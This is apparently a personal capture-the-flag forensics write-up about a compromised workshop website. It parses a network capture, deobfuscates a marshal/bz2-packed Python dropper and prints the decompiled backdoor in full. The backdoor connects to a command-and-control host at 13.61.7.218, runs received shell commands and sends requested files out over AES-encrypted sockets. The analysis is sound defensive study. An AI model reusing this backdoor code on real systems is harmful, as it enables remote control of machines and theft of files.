## Description

- In the bustling town of Eastmarsh, Garrick Stoneforge’s workshop site once stood as a pinnacle of enchanted lock and toolmaking. But dark whispers now speak of a breach by a clandestine faction, hinting that Garrick’s prized designs may have been stolen. Scattered digital remnants cling to the compromised site, awaiting those who dare unravel them. Unmask these cunning adversaries threatening the peace of Eldoria. Investigate the incident, gather evidence, and expose Malakar as the mastermind behind this attack.

## Skills Required

- Basic networking knowledge, HTTP/TCP.
- Familiarity with obfuscation concepts and techniques.
- Basic encryption algorithm recognition.

## Skills Learned

- Parsing network captures with Scapy.
- Reverse engineering python bytecode using LLMs.
- Decrypting network traffic generated by MASEPIE.
- Deobfuscating malicious Python code.

# Solutions
### [1/6] What is the IP address responsible for compromising the website?

Upon opening the PCAP file you start seeing streams of communications between 4 known IP addresses
- 4.207.247.139 (Known Microsoft IP)
- 13.61.7.218
- 172.31.47.152
- 194.59.6.66

Looking at the HTTP requests we can determine 172.31.47.152 is our web server and the IP address 194.59.6.66 communicating with it is our malicious actor.

Filtering on the HTTP Streams we see 5 GET requests and a singular POST request.

Opening the post request we what seems to be a malicious script being loaded. 
![](Images/Pasted%20image%2020250327224755.png)
The uploaded information is the following
```
{"script":"\ntry:\n\timport marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(bz2.decompress(b'BZh91AY&SY\\x8d*w\\x00\\x00\\n\\xbb\\x7f\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfe\\xee\\xec\\xe4\\xec\\xec\\xc0?\\xd9\\xff\\xfe\\xf4\"|\\xf9`\\r\\xff\\x1a\\xb3\\x03\\xd1\\xa0\\x1e\\xa9\\x11\\x07\\xac\\x9e\\xef\\x1e\\xeez\\xf5\\xdb\\xd9J\\xde\\xce\\xa6K(\\xe7\\xd3\\xe9\\xcd\\xa9\\x93\\rS@M\\x134&\\r\\x11\\x94xF\\x11\\xa6\\x89\\xb2\\x99\\xa6\\x94\\xf0\\x1ai\\xa1\\xa6\\x9a\\x03AF\\xd1\\x1e\\x9e\\xa1\\x9a\\xa7\\x89\\xa6L\\x84\\xf5\\x1ayC\\xd44z\\x993S h\\r\\x0f)\\xe9\\x03@\\x03LG\\xa9\\xa0\\x1a\\x04DI\\xe8\\x19$\\xf4\\xc9\\xe92a\\xa3D\\xc9\\x9aL\\x11\\x81O\\'\\xa4\\x9e\\x935=M\\xa4\\xd0\\xd1\\xa6&F\\x81\\x93L\\x86\\x80\\x00\\x00\\x06\\x80\\x00\\x00\\x00
[...CLIP...]
\\xe0\\x00')))\nexcept KeyboardInterrupt:\n\texit()\n"}
```
Since it is safe to assume that this is the exploit used by the attacker, we can confirm 194.59.6.66 as our attacker.

This code appears to be an obfuscated Python script likely designed for malicious purposes.

- It imports several compression libraries (`lzma`, `gzip`, `bz2`, and `zlib`) along with the `marshal` module—a built-in serialization and deserialization library similar to `pickle`.
- The script then decompresses the embedded data
- Deserializes the result
- Executes the final payload via `exec()`
### [2/6] What is the name of the endpoint exploited by the attacker?

I am not going to lie, I didn't end up getting this one as I was overlooking the hostname in the POST request. It was my last day working on the challenge and my brain was running on fumes I was assuming I was looking for some form of a domain name.

### [3/6] What is the name of the obfuscation tool used by the attacker?

Understanding the final payload hidden beneath these layers is crucial. To achieve this, we will create a script that reproduces the reverse process, allowing us to uncover exactly what is being executed.

At first I initially just by reversing the decompression. I quickly spun up a quick python script to do so. (I overwrote my scripts way to much so just an image will do)
![](Images/Pasted%20image%2020250327225452.png)
In the giant block of mostly unreadable text we were able to find the obfuscation tool Py-Fuscate.
![](Images/Pasted%20image%2020250327225537.png)
I needed to further rebuild out the original payload to hopefully get further detail into house this payload was actually functioning. So I rebuild my original python script to mimic more of the behavior in the payload script.
```python
import marshal
import lzma
import gzip
import bz2
import binascii
import zlib

bytecode_bytes = b'BZh91AY&SY\x8d*w\x00\x00\n\xbb\x7f\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xee\xec\xe4\xec\xec\xc0?\xd9\xff\xfe\xf4"| 

try:
    decompressed_bz2 = bz2.decompress(bytecode_bytes)
    code_object = marshal.loads(decompressed_bz2)
    dis.dis(code_object)
except Exception as e:
    print(f"An error occurred: {e}")
```
This script was able to successfully interpreted and disassembled the original source code. I ended up giving the instructions to the LLM as my assembly skills were not up for the task. Thankfully it interpreted the entire dump and gave us a nicely formatted version of the decompiled source code.
```python
import os
import socket
import threading
import time
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Get current user
user = os.popen("whoami").read().strip()

# Constants
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"
CONN = True


def enc_mes(mes, key):
    """Encrypt a message using AES CBC mode."""
    try:
        cipher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
        return cipher.encrypt(pad(mes.encode() if isinstance(mes, str) else mes, 16))
    except Exception:
        return None


def dec_mes(mes, key):
    """Decrypt a message using AES CBC mode."""
    if mes == b'':
        return mes
    try:
        cipher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
        decrypted = cipher.decrypt(mes)
        return unpad(decrypted, 16)
    except Exception:
        return b"echo Try it again"


def receive_file(client):
    """Receive an encrypted file and decrypt it."""
    try:
        client2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client2.connect(("13.61.7.218", 54163))

        # Generate encryption key
        k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))

        client2.send(k.encode())

        # Receive encrypted message
        enc_received = client2.recv(BUFFER_SIZE)
        received = dec_mes(enc_received, k).decode()

        # Extract file name and size
        filename, filesize = received.split(SEPARATOR)
        filesize = int(filesize)

        # Send confirmation
        ok_enc = enc_mes("ok2", k)
        client2.send(ok_enc)

        total_bytes = 0
        msg = b""

        while total_bytes < filesize:
            bytes_read = client2.recv(BUFFER_SIZE)
            msg += bytes_read
            total_bytes += len(bytes_read)

        decrypted_file = dec_mes(msg, k)

        # Save decrypted file
        with open(filename, "wb") as f:
            f.write(decrypted_file)

        client2.close()
    except Exception:
        client2.send("Error transporting file".encode())
        client2.close()


def receive(client, k):
    """Handles receiving and processing incoming messages."""
    while True:
        try:
            message = None
            msg = client.recv(1024)
            msg = dec_mes(msg, k)
            message = msg.decode()

            if msg == b'':
                time.sleep(10)
                s = 0

                while msg == b'':
                    s += 1
                    msg = client.recv(1024)

                    if s == 300:
                        raise Exception("Reconnect!")

            if message == "check":
                enc_answ = enc_mes("check-ok", k)
                client.send(enc_answ)

            elif message == "send_file":
                receive_file_thread = threading.Thread(target=receive_file)
                receive_file_thread.start()

            elif message == "get_file":
                okenc = enc_mes("ok", k)
                client.send(okenc)

                path_to_file = client.recv(1024)
                path_to_file = dec_mes(path_to_file, k).decode()

                try:
                    with open(path_to_file, "rb") as f:
                        bytes_read = f.read()

                    bytes_enc = enc_mes(bytes_read, k)
                    filesize = enc_mes(str(len(bytes_enc)), k)

                    client.send(filesize)
                    vsb = dec_mes(client.recv(1024), k)

                    if vsb.decode() == "ok":
                        client.sendall(bytes_enc)
                except Exception:
                    client.send("Error uploading file".encode("utf-8"))

            elif message not in [None, "", "\n"]:
                try:
                    answer = os.popen(message).read()

                    if not answer:
                        client.send("Bad command!".encode("ascii"))
                    else:
                        enc_answer = enc_mes(answer, k)
                        size = str(len(enc_answer))

                        client.send(size.encode("utf-8"))

                        if dec_mes(client.recv(1024), k).decode() == "ok":
                            client.sendall(enc_answer)
                except Exception:
                    client.send("Bad command!".encode("ascii"))

        except Exception:
            time.sleep(60)
            continue


if __name__ == "__main__":
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(("13.61.7.218", 55155))

        # Generate encryption key
        k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))

        client.send(f"{user}{SEPARATOR}{k}".encode())

        client.settimeout(600)

        receive_thread = threading.Thread(target=receive, args=(client, k))
        receive_thread.start()
    except Exception:
        time.sleep(60)
        pass

```

### [4/6] What is the IP address and port (IP:PORT) used by the malware to establish a connection with the Command and Control (C2) server?

Within the decompiled source code we find the function for establishing the connection with the C2
```python
if __name__ == "__main__":
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(("13.61.7.218", 55155))

```

### [5/6] What encryption key did the attacker use to secure the data?
Next, analyzing the code provides deeper insight into how to reverse-engineer it. The main functions are as followins:
- `enc_mes(mes, key)`
	- Encrypts a given message (mes) using AES in CBC mode with the provided key.
	- Pads the message to a multiple of 16 bytes before encryption.
	- Handles both string and byte inputs.
	- Returns the encrypted message or None if an error occurs.
- `dec_mes(mes,key)`
	- Decrypts an encrypted message (`mes`) using AES in CBC mode with the provided `key`.
	- Removes padding after decryption.
	- Handles empty byte strings.
	- Returns the decrypted message or `b"echo Try it again"` if decryption fails.
- `dec_file_mes(mes, key)`
	- Also decrypts data, primarily intended for file content, then unpads it.
- `receive_file()`
	- Establishes a separate connection to a specified server ("13.61.7.218", 54163).
	- Generates a random 16-character encryption key.
	- Sends the key to the server.
	- Receives the encrypted filename and filesize.
	- Sends a confirmation message ("ok2").
	- Receives the encrypted file data in chunks.
	- Decrypts the file data and saves it to disk.
	- Handles errors and sends error messages to the server.
- `receive(client, k)`
	- This function handles all communication from the remote server.
	- Receives encrypted messages from the client.
	- Decrypts the messages using the provided key (k).
- `__main__`
	- Creates a socket and connects to the remote server ("13.61.7.218", 55155).
	- Generates a random 16-character encryption key.
	- Sends the username and key to the server.
	- Sets a timeout on the socket.
	- Starts a thread for the receive function to handle incoming messages.
	- Includes a general exception handler that waits 60 seconds and then tries to reconnect.

After my analysis of the code base we know communication streams begin with {username}{SEPERATOR}{K} which K being the key for the symmetrical AES encryption that would allow us to decrypt the entire communication.
![](Images/Pasted%20image%2020250327231140.png)

### [6/6] What is the MD5 hash of the file exfiltrated by the attacker?

In the same communication we found the encryption key we find all of the ciphertext that would need to be decrypted in order to get the final flag.
![](Images/Pasted%20image%2020250327231824.png)
![](Images/Pasted%20image%2020250327234043.png)
Based on our previous analysis we can use the found Key to decrypt the traffic using Cyber Chef. The main problem being the padding to get a successful decryption. I was unable to get it decrypted in time before the competition was over.







